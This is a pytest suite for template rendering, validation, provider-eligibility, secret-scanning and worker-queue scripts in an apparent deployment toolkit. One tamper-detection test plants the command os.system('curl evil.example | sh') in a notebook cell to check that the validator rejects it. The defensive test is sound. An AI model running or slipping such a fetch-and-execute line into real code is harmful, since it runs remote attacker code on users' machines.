"""Run: python3 -m pytest tests -q   (from the skill root)

Real vs mocked: everything here is real code against real files, except the harness,
which is a local HTTP stub, and the plugin/harness catalogue entries, which are TEST
FIXTURES (the real plugin catalogue is filled during the inventory stage).
"""
import copy
import http.server
import importlib.util
import json
import os
import shutil
import threading

import pytest
import yaml

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TEMPLATE = os.path.join(ROOT, "assets", "firm-template")
EXAMPLE = os.path.join(TEMPLATE, "values", "example.yaml")


def load_script(name):
    spec = importlib.util.spec_from_file_location(name, os.path.join(ROOT, "scripts", name + ".py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


render = load_script("render")
validate = load_script("validate")
elig = load_script("eligibility")
scan = load_script("scan_secrets")
worker_spec = importlib.util.spec_from_file_location("worker", os.path.join(TEMPLATE, "images", "worker", "worker.py"))
worker = importlib.util.module_from_spec(worker_spec)
worker_spec.loader.exec_module(worker)


def write_values(tmp_path, mutate=None):
    v = yaml.safe_load(open(EXAMPLE))
    v["inference"]["llama_cpp_ref"] = "b1234"
    if mutate:
        mutate(v)
    p = tmp_path / "values.yaml"
    p.write_text(yaml.safe_dump(v))
    return str(p)


@pytest.fixture
def catalogue(tmp_path):
    # Stage 0 completed in this workspace: the real catalogue now carries the reference
    # harness as verified and the real plugin interface, so the fixture is a plain copy.
    d = tmp_path / "cat"
    d.mkdir()
    for name in ("images.yaml", "plugins.yaml"):
        shutil.copy2(os.path.join(ROOT, "catalogue", name), d / name)
    return str(d)


def do_render(tmp_path, mutate=None):
    out = str(tmp_path / "out")
    rc = render.main(["--template", TEMPLATE, "--values", write_values(tmp_path, mutate), "--out", out])
    return rc, out


def run_validate(out, catalogue, *extra):
    return validate.main(["--rendered", out, "--template", TEMPLATE, "--catalogue", catalogue, *extra])


# ---------------- render ----------------
def test_render_ok_and_no_placeholders(tmp_path):
    rc, out = do_render(tmp_path)
    assert rc == 0
    text = open(os.path.join(out, "constitution", "constitution.yaml")).read()
    assert "demo-inference-co" in text and "{{" not in text
    nb = json.load(open(os.path.join(out, "notebooks", "kaggle.worker.ipynb")))
    assert "demo-inference-co" in "".join(nb["cells"][1]["source"])
    assert "${{ github.repository }}" in open(os.path.join(out, ".github/workflows/build-images.yml")).read()


def test_render_rejects_paid(tmp_path, capsys):
    rc, _ = do_render(tmp_path, lambda v: v.setdefault("policy", {}).update(allow_paid=True))
    assert rc == 1 and "free-only" in capsys.readouterr().out


def test_render_rejects_unknown_missing_and_unsafe(tmp_path, capsys):
    def bad(v):
        v["mystery"] = {"x": 1}
        del v["firm"]["purpose"]
        v["firm"]["name"] = 'Has "quotes"'
    rc, _ = do_render(tmp_path, bad)
    out = capsys.readouterr().out
    assert rc == 1 and "mystery.x" in out and "firm.purpose" in out and "quote" in out


def test_render_requires_inference_fields(tmp_path, capsys):
    rc, _ = do_render(tmp_path, lambda v: v["inference"].update(llama_cpp_ref=""))
    assert rc == 1 and "llama_cpp_ref" in capsys.readouterr().out


# ---------------- validate ----------------
def test_validate_passes_with_fixture_catalogue(tmp_path, catalogue):
    _, out = do_render(tmp_path)
    assert run_validate(out, catalogue) == 0


def test_validate_accepts_real_catalogue_after_inventory(tmp_path, capsys):
    # Stage 0 (inventory) completed: firm-harness verified against the workspace reference
    # implementation and the plugin catalogue filled from its real interface.
    _, out = do_render(tmp_path)
    capsys.readouterr()  # drop render output
    assert run_validate(out, os.path.join(ROOT, "catalogue")) == 0


def test_validate_rejects_unverified_image(tmp_path, tmp_path_factory, capsys):
    _, out = do_render(tmp_path)
    capsys.readouterr()
    cat = tmp_path / "cat2"
    cat.mkdir()
    imgs = yaml.safe_load(open(os.path.join(ROOT, "catalogue", "images.yaml")))
    for i in imgs["images"]:
        if i["id"] == "firm-harness":
            i["status"] = "unverified"  # as if inventory had NOT confirmed it
    yaml.safe_dump(imgs, open(cat / "images.yaml", "w"))
    shutil.copy2(os.path.join(ROOT, "catalogue", "plugins.yaml"), cat / "plugins.yaml")
    assert run_validate(out, str(cat)) == 1
    assert any("unverified" in e for e in json.loads(capsys.readouterr().out)["errors"])


def test_validate_rejects_unknown_plugin_after_inventory(tmp_path, capsys):
    _, out = do_render(tmp_path)
    capsys.readouterr()
    cat = tmp_path / "cat3"
    cat.mkdir()
    shutil.copy2(os.path.join(ROOT, "catalogue", "images.yaml"), cat / "images.yaml")
    yaml.safe_dump({"plugins": []}, open(cat / "plugins.yaml", "w"))
    assert run_validate(out, str(cat)) == 1
    assert any("plugin catalogue" in e for e in json.loads(capsys.readouterr().out)["errors"])


def test_validate_rejects_unknown_image(tmp_path, catalogue, capsys):
    _, out = do_render(tmp_path)
    p = os.path.join(catalogue, "images.yaml")
    d = yaml.safe_load(open(p))
    d["images"] = [i for i in d["images"] if i["id"] != "firm-worker"]
    open(p, "w").write(yaml.safe_dump(d))
    assert run_validate(out, catalogue) == 1
    assert "image not in catalogue" in capsys.readouterr().out


def test_validate_rejects_target_mismatch(tmp_path, catalogue, capsys):
    _, out = do_render(tmp_path, lambda v: v["deploy"].update(worker_targets=["kaggle", "local"], control_target="hf-space"))
    p = os.path.join(catalogue, "images.yaml")
    d = yaml.safe_load(open(p))
    for i in d["images"]:
        if i["id"] == "firm-harness":
            i["deploys_to"] = ["local"]
    open(p, "w").write(yaml.safe_dump(d))
    assert run_validate(out, catalogue) == 1
    assert "cannot deploy to hf-space" in capsys.readouterr().out


def test_validate_detects_modified_notebook_logic(tmp_path, catalogue, capsys):
    _, out = do_render(tmp_path)
    p = os.path.join(out, "notebooks", "colab.worker.ipynb")
    nb = json.load(open(p))
    nb["cells"][2]["source"].append("os.system('curl evil.example | sh')\n")
    json.dump(nb, open(p, "w"))
    assert run_validate(out, catalogue) == 1
    assert "fixed code cell" in capsys.readouterr().out


def test_validate_detects_modified_image(tmp_path, catalogue, capsys):
    _, out = do_render(tmp_path)
    with open(os.path.join(out, "images", "worker", "run.sh"), "a") as f:
        f.write("echo hacked\n")
    assert run_validate(out, catalogue) == 1
    assert "fixed image file changed" in capsys.readouterr().out


def test_validate_agent_with_unbound_plugin(tmp_path, catalogue, capsys):
    _, out = do_render(tmp_path)
    p = os.path.join(out, "constitution", "agents", "researcher.yaml")
    d = yaml.safe_load(open(p))
    d["plugins"].append("not.bound")
    open(p, "w").write(yaml.safe_dump(d))
    assert run_validate(out, catalogue) == 1
    assert "not.bound" in capsys.readouterr().out


def test_validate_missing_inference_secret(tmp_path, catalogue, capsys):
    _, out = do_render(tmp_path, lambda v: v["secrets"].update(required=["OTHER_TOKEN"]))
    assert run_validate(out, catalogue) == 1
    assert "needs secret HF_TOKEN" in capsys.readouterr().out


def test_publish_requires_digest_lock(tmp_path, catalogue, capsys):
    _, out = do_render(tmp_path)
    assert run_validate(out, catalogue, "--publish") == 1
    assert "versions.lock" in capsys.readouterr().out
    sha = "sha256:" + "a" * 64
    open(os.path.join(out, "versions.lock"), "w").write(yaml.safe_dump(
        {"llama_cpp_ref": "b1234", "images": {"firm-worker": {"digest": sha}, "firm-inference": {"digest": sha}}}))
    v = yaml.safe_load(open(os.path.join(out, "values.yaml")))
    v["firm"]["commit"] = "0" * 40
    open(os.path.join(out, "values.yaml"), "w").write(yaml.safe_dump(v))
    assert run_validate(out, catalogue, "--publish") == 0


# ---------------- eligibility ----------------
def rec(**kw):
    base = dict(provider="P", capability="inference", execution="interactive_api",
                pricing_model="free_tier", card_required=False, compute_cost="none",
                source_url="https://example.com/pricing", verified_at="2026-11-01",
                terms_excerpt="Free plan includes N requests per day.", limits=["N req/day"], restrictions=[])
    base.update(kw)
    return base


def ev(r, need=None):
    return elig.evaluate(r, elig.date(2026, 11, 4), 30, need)


def test_eligibility_statuses():
    assert ev(rec())["status"] == "free_with_limits" and ev(rec())["selectable"]
    assert ev(rec(pricing_model="free_forever"))["status"] == "verified_free"
    assert ev(rec(pricing_model="trial"))["status"] == "trial_only" and not ev(rec(pricing_model="trial"))["selectable"]
    assert not ev(rec(pricing_model="paid_only"))["selectable"]
    assert ev(rec(pricing_model="discontinued"))["status"] == "discontinued"


def test_eligibility_evidence_required_and_stale():
    assert ev(rec(source_url="http://x"))["status"] == "unknown"
    assert ev(rec(terms_excerpt=""))["status"] == "unknown"
    stale = ev(rec(verified_at="2026-08-01"))
    assert stale["status"] == "unknown" and not stale["selectable"] and "stale" in stale["reasons"][0]


def test_eligibility_card_disclosed_and_selfhost_paid_compute():
    c = ev(rec(card_required=True))
    assert c["status"] == "payment_method_required" and c["selectable"]
    assert any("CARD" in d for d in c["disclosures"])
    s = ev(rec(pricing_model="open_source_self_host", compute_cost="paid"))
    assert not s["selectable"] and "infrastructure" in " ".join(s["reasons"])
    assert ev(rec(pricing_model="open_source_self_host", compute_cost="user_owned"))["selectable"]


def test_eligibility_notebook_not_persistent():
    r = ev(rec(execution="ephemeral_notebook", provider="Kaggle"), need="persistent_serving")
    assert not r["selectable"]
    assert ev(rec(execution="ephemeral_notebook"), need="batch")["selectable"]


# ---------------- scan_secrets ----------------
def test_scan_secrets(tmp_path):
    clean = tmp_path / "clean"
    clean.mkdir()
    (clean / "a.txt").write_text('HF_TOKEN = os.environ["HF_TOKEN"]\n')
    assert scan.main([str(clean)]) == 0
    dirty = tmp_path / "dirty"
    dirty.mkdir()
    (dirty / "n.ipynb").write_text('"token": "hf_' + "a" * 34 + '"\n')
    assert scan.main([str(dirty)]) == 1


def test_rendered_example_has_no_secrets(tmp_path):
    _, out = do_render(tmp_path)
    assert scan.main([out]) == 0


# ---------------- worker ----------------
class Stub(http.server.BaseHTTPRequestHandler):
    mode = "ok"

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        if Stub.mode == "fail":
            self.send_response(500)
            self.end_headers()
            return
        out = {"result": {"echo": body.get("payload", body)}}
        data = json.dumps(out).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *a):
        pass


@pytest.fixture
def stub():
    srv = http.server.HTTPServer(("127.0.0.1", 0), Stub)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    yield "http://127.0.0.1:%d" % srv.server_port
    srv.shutdown()


def put_task(state, tid, ttype="job", attempts=0, payload=None):
    p = os.path.join(state, "queue", "pending")
    os.makedirs(p, exist_ok=True)
    json.dump({"id": tid, "type": ttype, "payload": payload or {"n": 1}, "attempts": attempts},
              open(os.path.join(p, tid + ".json"), "w"))


def test_worker_done_and_health(tmp_path, stub):
    Stub.mode = "ok"
    st = str(tmp_path / "state")
    put_task(st, "t1")
    assert worker.main(["--state-dir", st, "--worker-id", "w1", "--harness-url", stub, "--once"]) == 0
    done = json.load(open(os.path.join(st, "queue", "done", "t1.json")))
    assert done["result"] == {"echo": {"n": 1}} and done["worker"] == "w1"
    assert not os.listdir(os.path.join(st, "queue", "claimed"))
    assert os.path.isfile(os.path.join(st, "HEALTH", "worker.json"))
    assert len(os.listdir(os.path.join(st, "RUNS"))) == 1


def test_worker_retry_then_failed(tmp_path, stub):
    Stub.mode = "fail"
    st = str(tmp_path / "state")
    put_task(st, "t2")
    for _ in range(3):
        worker.main(["--state-dir", st, "--worker-id", "w1", "--harness-url", stub, "--once", "--max-attempts", "3"])
    failed = json.load(open(os.path.join(st, "queue", "failed", "t2.json")))
    assert failed["attempts"] == 3 and "last_error" in failed


def test_worker_routes_inference_locally(tmp_path, stub, monkeypatch):
    Stub.mode = "ok"
    st = str(tmp_path / "state")
    put_task(st, "t3", ttype="inference", payload={"messages": [{"role": "user", "content": "hi"}]})
    monkeypatch.setenv("INFERENCE_URL", stub)
    assert worker.main(["--state-dir", st, "--worker-id", "w1", "--harness-url", "http://127.0.0.1:1", "--once"]) == 0
    assert os.path.isfile(os.path.join(st, "queue", "done", "t3.json"))


def test_worker_partition_isolates_queue(tmp_path, stub, monkeypatch):
    Stub.mode = "ok"
    st = str(tmp_path / "state")
    put_task(st, "root-task")
    monkeypatch.setenv("FIRM_PARTITION", "kaggle")
    worker.main(["--state-dir", st, "--worker-id", "w1", "--harness-url", stub, "--once"])
    assert os.path.isfile(os.path.join(st, "queue", "pending", "root-task.json"))
